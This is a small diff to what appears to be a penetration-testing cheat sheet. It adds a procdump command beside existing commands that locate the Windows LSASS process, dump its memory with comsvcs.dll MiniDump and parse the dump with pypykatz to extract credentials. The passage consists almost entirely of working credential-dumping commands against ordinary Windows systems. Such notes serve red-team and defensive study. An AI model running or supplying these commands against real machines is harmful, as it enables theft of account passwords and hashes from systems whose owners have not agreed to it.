@@ -77,6 +77,8 @@ CMD: tasklist /svc
 PowerShell: Get-Process lsass
 
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+procdump.exe -ma lsass.exe lsass.dmp
+
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
 
